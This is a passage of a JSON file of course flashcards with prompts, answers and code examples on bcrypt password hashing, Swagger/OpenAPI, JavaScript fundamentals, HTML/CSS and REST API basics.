9","bloom":"understand"},{"id":"password-hashing-card-03","type":"predict","prompt":"What type does `h` have after this line, and how do you fix it?\n\n```js\nconst h = bcrypt.hash('secret', 10);\n```\n","answer":"`h` is a Promise, not a hash string. Fix it by adding `await`: `const h = await bcrypt.hash('secret', 10);`","explanation":"`bcrypt.hash()` is an asynchronous function — it returns a Promise. Without `await`, the variable receives the unresolved Promise object. Any subsequent `bcrypt.compare()` call against this value will return `false`, breaking all logins silently.","example":"// Wrong — h is a Promise object\nconst h = bcrypt.hash('secret', 10);\n\n// Correct — h is the hash string\nconst h = await bcrypt.hash('secret', 10);\n","source":"Slide 11","bloom":"apply","lang":"js"},{"id":"password-hashing-card-04","type":"cloze","prompt":"`bcrypt.compare(plaintext, hash)` returns a {{boolean}} — it never decrypts the hash.","answer":"boolean","explanation":"`bcrypt.compare()` hashes the submitted plaintext using the parameters embedded in the stored hash string and compares the result. It returns `true` if they match and `false` otherwise. The original password is never recovered — hashing is one-way by design.","example":"const match = await bcrypt.compare(req.body.password, user.password); // true or false","source":"Slide 11","bloom":"remember"},{"id":"password-hashing-card-05","type":"name","prompt":"What does a cost factor of 10 mean in `bcrypt.hash(password, 10)`, and why does a higher cost factor improve security?","answer":"A cost factor of 10 means bcrypt performs 2^10 = 1,024 internal hashing iterations to produce the final hash. A higher cost factor makes each hash computation slower. An attacker attempting millions of brute-force guesses per second pays the full computation cost for every guess, making large-scale attacks significantly more expensive.","explanation":"The cost factor is the work factor. Doubling it (e.g., from 10 to 11) doubles the computation time per hash. Legitimate users log in once and barely notice the delay. Attackers running billions of attempts are slowed proportionally.","example":"CF 10 → 2^10 = 1,024 iterations. CF 12 → 2^12 = 4,096 iterations. Same password, ~4x harder to brute-force.","source":"Slide 11","bloom":"understand"}]},{"id":"api-documentation","name":"API documentation with OpenAPI / Swagger","tags":["swagger","OpenAPI","documentation","JSON"],"prose":"OpenAPI / Swagger is an Interface Description Language for describing RESTful APIs in a machine-readable JSON or YAML file (swagger.json). It documents endpoints, request parameters, request body schemas, response schemas, status codes, and authentication requirements. The starting point is the sample from editor.swagger.io; you customize the paths block in VS Code using the Swagger Viewer extension to preview the rendered docs.","cards":[{"id":"api-documentation-card-01","type":"cloze","prompt":"Swagger is an {{Interface Description Language}} for describing RESTful APIs expressed using JSON.","answer":"Interface Description Language","explanation":"The slide defines Swagger using the Wikipedia description: an Interface Description Language (IDL). IDLs describe the shape and contract of an interface — in this case, a REST API — independent of any specific implementation language.","example":"Just as an IDL for a library describes its function signatures, swagger.json describes an API's endpoint signatures.","source":"Slide 11","bloom":"remember"},{"id":"api-documentation-card-02","type":"name","prompt":"What format does a swagger.json file use?","answer":"JSON (or YAML) — a machine-readable specification format.","explanation":"OpenAPI / Swagger specs are written in JSON or YAML. The file is machine-readable, meaning tools like Swagger UI can parse it directly to render interactive documentation or generate client code without any additional human-authored prose.","example":"A swagger.json file stores endpoint definitions as nested JSON objects under the \"paths\" key.","source":"Slide 11","bloom":"remember"},{"id":"api-documentation-card-03","type":"name","prompt":"What is the starting point for creating a swagger.json for your project?","answer":"Download the sample from editor.swagger.io (File \u003e Convert and Save as JSON), then customize it.","explanation":"Rather than writing a swagger.json from scratch, you download a valid, well-structured sample from editor.swagger.io. That sample provides the correct top-level skeleton (openapi, info, paths) so you only need to replace the example paths with your own endpoints.","example":"Open editor.swagger.io, go to File \u003e Convert and Save as JSON, then open the file in VS Code and edit the paths block.","source":"Slide 11","bloom":"understand"},{"id":"api-documentation-card-04","type":"name","prompt":"What four things does an OpenAPI spec document about each endpoint?","answer":"Path, HTTP method, request schema (parameters or body), and response schema (status codes + body shape).","explanation":"Every entry in the paths block of a swagger.json covers: (1) the URL path, (2) the HTTP method (get, post, etc.), (3) the request shape — path/query parameters or a requestBody schema — and (4) the response definitions, mapping each status code to a description and optional body schema. Authentication is documented at the spec or operation level separately.","example":"A GET /patients entry names the path, specifies \"get\", lists any query params, and maps status 200 to a schema describing the returned patient array.","source":"Slide 11","bloom":"understand"},{"id":"api-documentation-card-05","type":"predict","prompt":"A developer writes a `swagger.json` from scratch and gets this error from Swagger UI: \"No operations defined in spec!\" The file has this top-level structure:\n\n```json\n{ \"info\": { \"title\": \"My API\" }, \"paths\": {} }\n```\n\nIdentify two problems and state how to fix them.\n","answer":"1. Missing `openapi` version key — add `\"openapi\": \"3.0.0\"`. 2. Empty `paths` object — add at least one endpoint definition under `paths`. Start from the editor.swagger.io sample to get a valid skeleton.","explanation":"The `openapi` field declares the specification version and is required for Swagger UI to parse the file. An empty `paths` object is valid structure but produces no rendered endpoints. The editor.swagger.io sample includes both the `openapi` key and example paths, making it the correct starting point rather than writing from scratch.","example":"// Minimal valid swagger.json:\n{ \"openapi\": \"3.0.0\", \"info\": { \"title\": \"My API\", \"version\": \"1.0.0\" }, \"paths\": { \"/patients\": { \"get\": { \"summary\": \"Get patients\", \"responses\": { \"200\": { \"description\": \"OK\" } } } } } }\n","source":"Slide 11","bloom":"apply","lang":"json"}]}]},{"id":"m1-javascript-foundations","name":"JavaScript Foundations and Web Basics","topics":[{"id":"js-scope-hoisting","name":"var/let/const scope, hoisting, event loop","tags":["hoisting","var","let","const","scope","block-scope"],"prose":"JavaScript hoists var declarations to the top of their enclosing function scope, initializing them to undefined. let and const are block-scoped and throw ReferenceError if accessed before their declaration line. Functions without a return statement return undefined. The event loop drains the microtask queue before picking the next macrotask.","cards":[{"id":"js-scope-hoisting-card-01","type":"cloze","prompt":"Declaring a variable with {{var}} hoists the declaration to the function top but NOT the initialization, so reading it before assignment returns {{undefined}}.","answer":"var; undefined","explanation":"The JavaScript compiler registers all var declarations in the function scope before execution. The assignment stays in place. So the variable exists but holds undefined until the assignment line runs.","example":"console.log(x); // undefined, not ReferenceError\nvar x = 5;\n","source":"Slide 1, ISAQuiz6","bloom":"remember"},{"id":"js-scope-hoisting-card-02","type":"cloze","prompt":"Accessing a {{let}} or {{const}} variable before its declaration line throws a {{ReferenceError}}, not undefined, because those declarations are in the Temporal Dead Zone.","answer":"let; const; ReferenceError","explanation":"let and const are block-scoped. They are processed during compilation but remain inaccessible (TDZ) until the declaration line executes. Reading them early is a hard error, unlike var which silently returns undefined.","example":"console.log(a); // ReferenceError\nlet a = 5;\n","source":"Slide 1, ISAQuiz6","bloom":"remember"},{"id":"js-scope-hoisting-card-03","type":"predict","prompt":"Predict the output:\n```js\nif (true) {\n  let a = 5;\n}\nconsole.log(a);\n```\n","answer":"Uncaught ReferenceError: a is not defined","explanation":"let is block-scoped to the if block. Once the block closes, a no longer exists in the outer scope. Accessing a outside throws ReferenceError, not undefined.","example":"// The ReferenceError message: 'a is not defined'\n// var a = 5 inside the block would NOT throw — var is function-scoped\n","source":"ISAQuiz6 Q5","bloom":"apply","lang":"js"},{"id":"js-scope-hoisting-card-04","type":"predict","prompt":"Predict the output:\n```js\nif (m = []) {\n  console.log(\"Green\");\n}\nvar m = 10;\n```\n","answer":"Green","explanation":"var m is hoisted so m exists before the if. m = [] is an assignment expression evaluating to [] (truthy). The if body runs and prints Green.","example":"// var m hoisted → m exists as undefined\n// m = [] assigns [] to m → [] is truthy\n// console.log('Green') runs\n","source":"ISAQuiz6 Q4","bloom":"apply","lang":"js"},{"id":"js-scope-hoisting-card-05","type":"predict","prompt":"Predict the output:\n```js\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) {\n    s += i;\n  }\n}\nconsole.log(foo(3));\n```\n","answer":"undefined","explanation":"foo computes s internally but has no return statement. Every function that exits without return implicitly returns undefined.","example":"// s = 3 is computed but never returned\n// foo(3) returns undefined → console.log prints undefined\n","source":"ISAQuiz6 Q6","bloom":"analyze","lang":"js"},{"id":"js-scope-hoisting-card-06","type":"name","prompt":"What is the order in which the JavaScript event loop processes task queues after the call stack empties?","answer":"Microtask queue (fully drained), then one macrotask, then microtask queue again.","explanation":"Promise .then() callbacks land in the microtask queue. setTimeout/setInterval callbacks land in the macrotask queue. The microtask queue always drains completely before the event loop picks the next macrotask.","example":"// Resolve 10 Promises before setTimeout fires:\n// All 10 .then callbacks run before the setTimeout callback.\n","source":"Slide 3","bloom":"understand"},{"id":"js-scope-hoisting-card-07","type":"name","prompt":"var is function-scoped. What scope do let and const use?","answer":"Block scope — the nearest enclosing {}.","explanation":"Any pair of curly braces creates a block: if, for, while, or a bare {}. let and const declared inside a block are invisible outside it.","example":"{\n  let x = 5;\n  const y = 10;\n}\nconsole.log(x); // ReferenceError\n","source":"Slide 1","bloom":"remember"},{"id":"js-scope-hoisting-card-08","type":"cloze","prompt":"A function that exits without a {{return}} statement implicitly returns {{undefined}}, regardless of any values computed internally.","answer":"return; undefined","explanation":"JavaScript automatically appends an implicit return undefined to every function that falls off the end. The caller receives undefined.","example":"function compute() { var x = 9; }\nconsole.log(compute()); // undefined\n","source":"ISAQuiz6 Q6","bloom":"remember"}]},{"id":"js-async-event-loop","name":"Asynchronous JS, single-threaded non-blocking model, event queue","tags":["async","event-loop","setTimeout","single-thread","non-blocking"],"prose":"JavaScript's single-threaded non-blocking model runs all code on one thread by delegating I/O to the OS and resuming via callbacks. The event loop drains the entire microtask queue before pulling the next macrotask, so Promise .then callbacks always execute before setTimeout callbacks when both are ready.","cards":[{"id":"js-async-event-loop-card-01","type":"cloze","prompt":"JavaScript is {{single-threaded non-blocking}}: one thread handles all requests by delegating I/O to the OS and resuming via callbacks.","answer":"single-threaded non-blocking","explanation":"One thread executes JS code. The thread never blocks on I/O because Node.js offloads I/O to the OS and receives a callback when done.","example":"// Only one thing runs at a time, but I/O does not block execution\n// Node.js hands file reads to the OS and continues running other code\n","source":"Slide 4","bloom":"remember"},{"id":"js-async-event-loop-card-02","type":"name","prompt":"What is the JavaScript runtime mechanism that dequeues callbacks when the call stack is empty?","answer":"The event loop","explanation":"The event loop checks after each synchronous run-to-completion: drain all microtasks, then pull one macrotask. It repeats this cycle indefinitely.","example":"// Event loop pseudo-code:\n// while (true) { drainMicrotaskQueue(); runOneMacrotask(); }\n","source":"Slide 4","bloom":"remember"},{"id":"js-async-event-loop-card-03","type":"predict","prompt":"What is the output of this code?\n```js\nsetTimeout(function() { console.log(1); console.log(2); console.log(3); }, 500);\nconsole.log(4);\n```\n","answer":"4, then 1, 2, 3","explanation":"console.log(4) is synchronous and runs immediately. The setTimeout callback is a macrotask queued after at least 500 ms. The call stack must empty before any macrotask fires.","example":"// Sync runs first, macrotasks run after the stack clears\n","source":"ISAQuiz6","bloom":"apply","lang":"js"},{"id":"js-async-event-loop-card-04","type":"predict","prompt":"What is the output of this code?\n```js\nsetTimeout(function() { console.log(1); }, 1);\nnew Promise(function(resolve) {\n  console.log(2);\n  resolve();\n}).then(function() { console.log(4); });\nconsole.log(3);\n```\n","answer":"2, 3, 4, 1","explanation":"Executor runs eagerly: 2 prints. resolve() enqueues .then as a microtask. console.log(3) runs sync. Stack empties then microtask drains (4). Macrotask fires last (1).","example":"// Order: sync (2, 3) → microtask (4) → macrotask (1)\n","source":"ISAQuiz8","bloom":"apply","lang":"js"},{"id":"js-async-event-loop-card-05","type":"cloze","prompt":"The Promise executor runs {{eagerly}}: it executes immediately when `new Promise(executor)` is called, before any following synchronous statement.","answer":"eagerly","explanation":"Eager execution means the executor is not deferred. It runs synchronously on the call stack the instant the Promise is constructed.","example":"new Promise((resolve) =\u003e {\n  console.log('runs now'); // sync, not deferred\n  resolve();\n});\nconsole.log('runs second');\n// Output: 'runs now', 'runs second'\n","source":"ISAQuiz8","bloom":"understand"},{"id":"js-async-event-loop-card-06","type":"name","prompt":"Which queue drains completely before the next macrotask runs: microtask queue or macrotask queue?","answer":"The microtask queue drains completely first.","explanation":"After the call stack empties, the event loop drains all pending microtasks (Promise .then callbacks) before pulling even one macrotask (setTimeout, I/O callback).","example":"// If you resolve 10 Promises before a setTimeout fires,\n// all 10 .then callbacks run before the setTimeout callback.\n","source":"Slide 4, ISAQuiz8","bloom":"understand"},{"id":"js-async-event-loop-card-07","type":"predict","prompt":"Which of the following are native async (Web API-backed) and which are synchronous?\nsetTimeout / setInterval / forEach / console.log\n","answer":"setTimeout and setInterval are native async; forEach and console.log are synchronous.","explanation":"setTimeout and setInterval delegate to the runtime timer subsystem and return callbacks as macrotasks. forEach iterates inline on the call stack. console.log writes to stdout synchronously.","example":"// forEach is NOT async even if you pass an async function to it\n[1,2,3].forEach(async (n) =\u003e { await doSomething(n); }); // Promises discarded\n","source":"ISAQuiz8","bloom":"analyze","lang":"js"},{"id":"js-async-event-loop-card-08","type":"cloze","prompt":"If a Promise executor never calls resolve() or reject(), the Promise stays {{pending}} and all attached .then() callbacks {{never run}}.","answer":"pending; never run","explanation":"Microtask callbacks only enqueue when the Promise transitions to fulfilled or rejected. A permanently pending Promise means its reaction callbacks are never dispatched.","example":"new Promise((resolve) =\u003e {\n  console.log(1); // runs\n  // resolve never called\n}).then(() =\u003e console.log(2)); // never runs\nconsole.log(3); // runs\n// Output: 1, 3\n","source":"ISAQuiz8","bloom":"analyze"}]},{"id":"js-oop","name":"OOP in JS (classes, inheritance, composition)","tags":["OOP","classes","extends","super","constructor","typeof"],"prose":"JavaScript provides three object-creation syntaxes: Object Literal, Constructor Function, and ES6 Class. Classes support inheritance via extends and super. typeof [] returns 'object', not 'array'. Computed property access uses a variable's value as the key.","cards":[{"id":"js-oop-card-01","type":"cloze","prompt":"`typeof []` returns {{object}} in JavaScript, not array — arrays are objects.","answer":"object","explanation":"typeof tests the primitive type; it returns 'object' for any non-primitive, including arrays. Use Array.isArray() to check for arrays specifically. ISAQuiz4 tests this trap directly.","example":"console.log(typeof []);          // 'object'\nconsole.log(Array.isArray([]));  // true\n","source":"ISAQuiz4","bloom":"remember"},{"id":"js-oop-card-02","type":"name","prompt":"What keyword must you call before using `this` in a subclass constructor?","answer":"`super()` — omitting it throws a ReferenceError before `this` is accessible.","explanation":"super() invokes the parent constructor and initializes inherited properties. Until super() runs, this does not exist in the subclass constructor.","example":"class Student extends Person {\n  constructor(name, gpa) {\n    super(name); // must come first\n    this.gpa = gpa;\n  }\n}\n","source":"Slide 1","bloom":"remember"},{"id":"js-oop-card-03","type":"cloze","prompt":"`let sandwich = { bread: 'white', filling: 'turkey' }` uses {{Object Literal}} syntax, not Constructor syntax.","answer":"Object Literal","explanation":"Object Literal syntax uses curly braces with key-colon-value pairs, no `new` keyword. Constructor syntax requires a function or class with `new`. ISAQuiz4 presents this as a multiple-choice trap.","example":"let obj = { a: 1, b: 2 };        // Object Literal\nfunction Obj(a) { this.a = a; }\nlet obj2 = new Obj(1);            // Constructor\n","source":"ISAQuiz4","bloom":"remember"},{"id":"js-oop-card-04","type":"predict","prompt":"What does this code print?\n```js\nlet profile = { name: \"Elon\", gpa: 3.9 };\nlet arr = [\"name\", \"gpa\", \"id\"];\nconsole.log(profile[arr[1]]);\n```\n","answer":"3.9","explanation":"arr[1] evaluates to the string 'gpa'. profile['gpa'] returns 3.9. Computed property access uses the value of the expression inside [] as the key.","example":"// arr[1] = 'gpa'\n// profile['gpa'] = 3.9\n","source":"ISAQuiz4","bloom":"apply","lang":"js"},{"id":"js-oop-card-05","type":"predict","prompt":"What does this code print?\n```js\nlet obj = { a: 1, b: 2, c: 3 };\nconsole.log(obj[\"1\"]);\n```\n","answer":"undefined","explanation":"The object has keys 'a', 'b', 'c'. There is no key '1'. Accessing a non-existent key returns undefined, not an error.","example":"let obj = { a: 1 };\nconsole.log(obj[\"a\"]); // 1\nconsole.log(obj[\"z\"]); // undefined\n","source":"ISAQuiz4","bloom":"apply","lang":"js"},{"id":"js-oop-card-06","type":"name","prompt":"What is wrong with the syntax `obj.[moreNums]`?","answer":"Invalid — dot and bracket notation cannot be combined. Use `obj.moreNums` or `obj[moreNums]`.","explanation":"Dot notation accesses a named property. Bracket notation evaluates the expression inside [] as the key. Mixing them is a syntax error. ISAQuiz4 tests this trap.","example":"let key = \"name\";\nobj.name;   // valid dot notation\nobj[key];   // valid bracket notation\nobj.[key];  // SyntaxError\n","source":"ISAQuiz4","bloom":"understand"},{"id":"js-oop-card-07","type":"cloze","prompt":"In `class Student extends Person`, the keyword {{extends}} sets up prototype-chain inheritance.","answer":"extends","explanation":"extends wires Student's prototype to Person's prototype chain. Methods defined in Person become available on Student instances via prototype lookup.","example":"class Animal { speak() { return 'noise'; } }\nclass Dog extends Animal {}\nnew Dog().speak(); // 'noise' — inherited\n","source":"Slide 1","bloom":"remember"},{"id":"js-oop-card-08","type":"predict","prompt":"What does this code print?\n```js\nclass Person { constructor(name) { this.name = name; } }\nclass Student extends Person {\n  constructor(name, gpa) { super(name); this.gpa = gpa; }\n}\nlet s = new Student(\"Ada\", 4.0);\nconsole.log(s instanceof Person);\n```\n","answer":"true","explanation":"Student extends Person, so Student's prototype chain includes Person.prototype. instanceof traverses the chain — any Student instance is also a Person instance.","example":"// s instanceof Student → true\n// s instanceof Person  → true (prototype chain)\n","source":"Slide 1","bloom":"apply","lang":"js"}]},{"id":"js-functions","name":"Function declarations, callbacks, first-class functions, closures","tags":["callbacks","higher-order","closures","return-types","parameter","argument"],"prose":"JavaScript functions are first-class values: assignable, passable, and returnable. Parameters are definition-site placeholders; arguments are call-site values. A function with no return statement returns undefined. A closure retains access to enclosing-scope variables after that scope exits.","cards":[{"id":"js-functions-card-01","type":"cloze","prompt":"A function's {{parameter}} is the variable name in the definition; the {{argument}} is the actual value passed at the call site.","answer":"parameter; argument","explanation":"These two terms are not synonyms. The definition declares parameters; the caller supplies arguments. COMP4537 quizzes test this distinction by name.","example":"function greet(name) { return \"Hi \" + name; }  // name is the parameter\ngreet(\"John\");                                   // \"John\" is the argument\n","source":"ISAQuiz3","bloom":"remember"},{"id":"js-functions-card-02","type":"predict","prompt":"What does this code print?\n```js\nfunction foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) { s += i; }\n}\nconsole.log(foo(3));\n```\n","answer":"undefined","explanation":"foo has no return statement. JavaScript implicitly returns undefined. The computed value of s is never exposed to the caller.","example":"// s = 3 is computed but not returned\n// foo(3) returns undefined\n","source":"ISAQuiz3","bloom":"apply","lang":"js"},{"id":"js-functions-card-03","type":"predict","prompt":"What does this code print?\n```js\nfunction subtract(a, b) { return a - b; }\nconsole.log(subtract(23, 12) - subtract(10, 3));\n```\n","answer":"4","explanation":"subtract(23,12) returns 11. subtract(10,3) returns 7. 11 - 7 = 4.","example":"// subtract(23, 12) → 11\n// subtract(10, 3)  → 7\n// 11 - 7 = 4\n","source":"ISAQuiz3","bloom":"apply","lang":"js"},{"id":"js-functions-card-04","type":"predict","prompt":"What does this code print?\n```js\nfunction checkString(s) { return s === \"John\"; }\ncheckString(\"John\");\n```\n","answer":"Nothing is printed.","explanation":"The function returns true, but the return value is discarded. No console.log exists at the call site.","example":"// checkString(\"John\") returns true\n// But no console.log — nothing is printed\n","source":"ISAQuiz3","bloom":"analyze","lang":"js"},{"id":"js-functions-card-05","type":"name","prompt":"What is a function that either accepts a function as an argument or returns a function called?","answer":"A higher-order function","explanation":"Array.map, Array.filter, and Array.forEach are examples. They accept a callback function as their argument.","example":"// Array.map is a higher-order function\n[1, 2, 3].map(n =\u003e n * 2); // callback passed as argument\n","source":"Slide 3","bloom":"remember"},{"id":"js-functions-card-06","type":"cloze","prompt":"A {{closure}} is a function that retains access to variables from its {{enclosing scope}} after that scope has exited.","answer":"closure; enclosing scope","explanation":"The inner function in hiGenerator closes over greeting. Even after hiGenerator returns, greeting remains accessible through the closure's scope chain.","example":"function hiGenerator(greeting) {\n  return function(name) {\n    return greeting + ', ' + name;\n  };\n}\nconst sayHi = hiGenerator('Hello');\nconsole.log(sayHi('World')); // Hello, World\n","source":"ISAQuiz6","bloom":"understand"},{"id":"js-functions-card-07","type":"predict","prompt":"What does this code print?\n```js\nfunction tripleNumber(n) { return n * 3; }\nfor (let i = 0; i \u003c 4; i++) {\n  console.log(tripleNumber(i));\n}\n```\n","answer":"0, 3, 6, 9 (each on a separate line)","explanation":"i iterates 0, 1, 2, 3. tripleNumber multiplies each by 3: 0, 3, 6, 9.","example":"// i=0: 0*3=0 / i=1: 1*3=3 / i=2: 2*3=6 / i=3: 3*3=9\n","source":"ISAQuiz3","bloom":"apply","lang":"js"},{"id":"js-functions-card-08","type":"name","prompt":"What term describes a function passed as an argument to another function, to be called later?","answer":"A callback","explanation":"The receiving higher-order function calls the callback — synchronously or asynchronously. Array.map's argument is a callback.","example":"function doTwice(fn) { fn(); fn(); }\ndoTwice(() =\u003e console.log('hi')); // callback passed as argument\n","source":"Slide 3","bloom":"remember"}]},{"id":"js-arrays-loops","name":"Arrays, loops, iteration patterns","tags":["arrays","for-loop","iteration","index","break","continue"],"prose":"JavaScript arrays are sparse objects. Unassigned slots return undefined. Loop boundaries with \u003c= instead of \u003c cause an off-by-one that reads undefined on the last pass.","cards":[{"id":"js-arrays-loops-card-01","type":"predict","prompt":"Predict the output: arr = []; arr[1] = 1234; console.log(arr[0]);","answer":"undefined","explanation":"Index 0 was never assigned. Unassigned sparse slots return undefined, not an error.","example":"let arr = [];\narr[1] = 1234;\nconsole.log(arr[0]); // undefined\n","source":"ISAQuiz2","bloom":"apply","lang":"js"},{"id":"js-arrays-loops-card-02","type":"predict","prompt":"arr = ['a','b','c','d','e','f']; What does arr[arr.length / 2] return?","answer":"'d'","explanation":"arr.length is 6. 6/2 = 3. arr[3] is 'd' (zero-indexed: a=0, b=1, c=2, d=3).","example":"const arr = ['a', 'b', 'c', 'd', 'e', 'f'];\nconsole.log(arr[arr.length / 2]); // arr[3] = 'd'\n","source":"ISAQuiz2","bloom":"apply","lang":"js"},{"id":"js-arrays-loops-card-03","type":"cloze","prompt":"Using `i \u003c= arr.length` in a for-loop causes the last iteration to read arr[{{arr.length}}], which returns {{undefined}}.","answer":"arr.length; undefined","explanation":"arr.length is one past the last valid index. That slot does not exist and evaluates to undefined. Use `i \u003c arr.length` to avoid this.","example":"const arr = [1, 2, 3];\nfor (let i = 0; i \u003c= arr.length; i++) {\n  console.log(arr[i]); // final pass: arr[3] = undefined\n}\n","source":"ISAQuiz2","bloom":"understand"},{"id":"js-arrays-loops-card-04","type":"predict","prompt":"How many lines does this print? for(let i=0;i\u003c3;i++){for(let j=0;j\u003c3;j++){console.log(i,j);}}","answer":"9","explanation":"Two nested loops each running 3 iterations produce 3 x 3 = 9 total iterations.","example":"for (let i = 0; i \u003c 3; i++) {\n  for (let j = 0; j \u003c 3; j++) {\n    console.log(i, j); // 9 lines total\n  }\n}\n","source":"ISAQuiz2","bloom":"apply","lang":"js"},{"id":"js-arrays-loops-card-05","type":"name","prompt":"What term describes an array where some index slots were never assigned?","answer":"sparse array","explanation":"A sparse array has holes — integer keys that were skipped. Holes read as undefined.","example":"let arr = [];\narr[5] = 'hello';\nconsole.log(arr[0]); // undefined (hole at index 0)\n","source":"ISAQuiz2","bloom":"remember"},{"id":"js-arrays-loops-card-06","type":"predict","prompt":"Predict the output: for(let i=0;i\u003c5;i++){if(i===2)break; console.log(i);}","answer":"0, 1","explanation":"break fires when i===2 before console.log executes for that iteration. Only 0 and 1 are logged.","example":"for (let i = 0; i \u003c 5; i++) {\n  if (i === 2) break;\n  console.log(i); // 0, 1\n}\n","source":"ISAQuiz2","bloom":"apply","lang":"js"},{"id":"js-arrays-loops-card-07","type":"predict","prompt":"console.log(parseInt('Hello123')) — what does this return?","answer":"NaN","explanation":"parseInt reads left-to-right. The string starts with 'H', not a digit, so parsing fails immediately and returns NaN.","example":"console.log(parseInt(\"Hello123\")); // NaN\nconsole.log(parseInt(\"123Hello\")); // 123\n","source":"ISAQuiz2","bloom":"apply","lang":"js"},{"id":"js-arrays-loops-card-08","type":"cloze","prompt":"Setting arr.length = 4 on a 6-element array {{deletes}} elements at index 4 and 5.","answer":"deletes","explanation":"Reducing arr.length truncates the array. Elements at the removed indices are permanently deleted.","example":"const arr = [1, 2, 3, 4, 5, 6];\narr.length = 4;\nconsole.log(arr); // [1, 2, 3, 4]\n","source":"ISAQuiz2","bloom":"understand"}]},{"id":"html-css-review","name":"HTML DOM structure, CSS box model, selectors, attributes","tags":["HTML","CSS","DOM","box-model","selectors","attributes"],"prose":"The CSS box model layers every element in four concentric zones: content, padding, border, margin. Selectors target elements by type, class, or combination; commas group them, spaces express ancestry. The color property changes text color; background-color changes the background. HTML attributes use either single or double quotes.","cards":[{"id":"html-css-review-card-01","type":"cloze","prompt":"The CSS box model layers from inside out are: {{content}}, {{padding}}, {{border}}, {{margin}}.","answer":"content; padding; border; margin","explanation":"The content layer holds text and child elements. Padding adds transparent space inside the border. The border wraps padding. Margin separates the element from its neighbors.","example":".box {\n  padding: 10px;          /* inside border */\n  border: 2px solid black;\n  margin: 20px;           /* outside border */\n}\n","source":"ISAQuiz1","bloom":"remember"},{"id":"html-css-review-card-02","type":"cloze","prompt":"To change an element's background color in CSS, use the property {{background-color}}, not {{color}}.","answer":"background-color; color","explanation":"`color` changes text color. `background-color` changes the element's background. ISAQuiz1 tests this distinction directly.","example":"p {\n  color: black;             /* text is black */\n  background-color: yellow; /* background is yellow */\n}\n","source":"ISAQuiz1","bloom":"remember"},{"id":"html-css-review-card-03","type":"cloze","prompt":"The CSS grouping selector `h1, h2, p { color: red; }` targets {{all three element types}}. Without the comma, `h1 h2 p` creates a {{descendant}} selector.","answer":"all three element types; descendant","explanation":"Commas group independent selectors. Spaces create descendant selectors — a completely different relationship.","example":"h1, h2, p { color: red; }   /* grouping — all three */\nh1 h2 p { color: blue; }    /* descendant — p inside h2 inside h1 */\n","source":"ISAQuiz1","bloom":"understand"},{"id":"html-css-review-card-04","type":"cloze","prompt":"In HTML, `\u003c!DOCTYPE html\u003e` must appear {{before the \u003chtml\u003e element}}. `\u003chead\u003e` and `\u003cbody\u003e` are direct children of {{\u003chtml\u003e}}.","answer":"before the \u003chtml\u003e element; \u003chtml\u003e","explanation":"The DOCTYPE declaration tells the browser which HTML version to parse. It is not an element and has no closing tag.","example":"\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003chead\u003e...\u003c/head\u003e\n  \u003cbody\u003e...\u003c/body\u003e\n\u003c/html\u003e\n","source":"ISAQuiz1","bloom":"remember"},{"id":"html-css-review-card-05","type":"name","prompt":"What two attributes does an `\u003cimg\u003e` element use to specify the image file and its fallback text?","answer":"`src` and `alt`","explanation":"`src` provides the file path or URL. `alt` provides text the browser displays when the image cannot load.","example":"\u003cimg src=\"photo.jpg\" alt=\"A red barn in a field\"\u003e\n","source":"ISAQuiz1","bloom":"remember"},{"id":"html-css-review-card-06","type":"name","prompt":"What are the three ways to attach CSS to an HTML document?","answer":"External `\u003clink\u003e` in `\u003chead\u003e`, internal `\u003cstyle\u003e` in `\u003chead\u003e`, inline `style` attribute on an element","explanation":"External stylesheets are most maintainable. Internal styles scope to one page. Inline styles have the highest specificity.","example":"\u003clink rel=\"stylesheet\" href=\"styles.css\"\u003e  \u003c!-- external --\u003e\n\u003cstyle\u003ep { color: red; }\u003c/style\u003e            \u003c!-- internal --\u003e\n\u003cp style=\"color: red;\"\u003eText\u003c/p\u003e             \u003c!-- inline --\u003e\n","source":"ISAQuiz1","bloom":"remember"},{"id":"html-css-review-card-07","type":"cloze","prompt":"The CSS selector `div.container` matches a {{\u003cdiv\u003e element that also has the class container}}.","answer":"\u003cdiv\u003e element that also has the class container","explanation":"No space between element and class name means both conditions apply to the same element. A space (`div .container`) creates a descendant relationship — a completely different rule requiring you to apply your knowledge of selector syntax to determine what is matched.","example":"div.container { border: 1px solid; }  /* targets \u003cdiv class='container'\u003e */\ndiv .container { border: 1px solid; } /* targets .container inside a div */\n","source":"ISAQuiz1","bloom":"apply"},{"id":"html-css-review-card-08","type":"name","prompt":"Which CSS units are valid for specifying font size?","answer":"`px`, `em`, and `%` are all valid CSS units for font size.","explanation":"`px` is absolute. `em` is relative to the parent element's font size. `%` is relative to the inherited font size. All three appear in ISAQuiz1.","example":"p { font-size: 16px; }\nh2 { font-size: 1.5em; }\nsmall { font-size: 80%; }\n","source":"ISAQuiz1","bloom":"remember"}]}]},{"id":"m2-web-architecture","name":"Web Architecture and Data Exchange","topics":[{"id":"rest-anatomy","name":"Anatomy of Web APIs","tags":["REST","API","endpoint","headers","HTTP-methods","status-codes"],"prose":"Anatomy of web APIs: endpoints, headers, HTTP methods (GET/POST/PUT/PATCH/DELETE/HEAD), idempotency, and status code ranges.","cards":[{"id":"rest-anatomy-card-01","type":"name","prompt":"What is an endpoint?","answer":"The URL where the API server is listening.","explanation":"The endpoint is the address you send your request to. Example: https://api.example.com/v1/patients/ — the server listens at this URL for incoming requests.","example":"https://api.example.com/v1/patients/1/ is the endpoint for patient #1.","source":"Slide 3","bloom":"remember"},{"id":"rest-anatomy-card-02","type":"cloze","prompt":"GET requests can be {{bookmarked}}, POST requests cannot.","answer":"bookmarked","explanation":"GET data appears in the URL. The browser can save and replay that URL as a bookmark. POST data is in the request body, which the browser does not capture in a bookmark.","example":"A search query like GET /patients?name=Alice can be bookmarked. POST /patients/ with a JSON body cannot.","source":"Slide 8, Quiz 6","bloom":"remember"},{"id":"rest-anatomy-card-03","type":"cloze","prompt":"PUT replaces the {{entire}} resource; PATCH updates a {{single}} property.","answer":"entire; single","explanation":"PUT is idempotent and replaces the full record at the URI. PATCH applies partial modifications. Sending PUT with a partial object overwrites omitted fields.","example":"PUT /patients/1 with {name: Bob, age: 25} replaces all fields. PATCH /patients/1 with {age: 26} updates only age.","source":"Slide 8","bloom":"understand"},{"id":"rest-anatomy-card-04","type":"name","prompt":"What does idempotent mean?","answer":"An operation is idempotent if applying it multiple times produces the same result as applying it once.","explanation":"GET, PUT, DELETE, and HEAD are idempotent. POST and PATCH are not. Sending the same DELETE request twice leaves the resource in the same state (deleted) as sending it 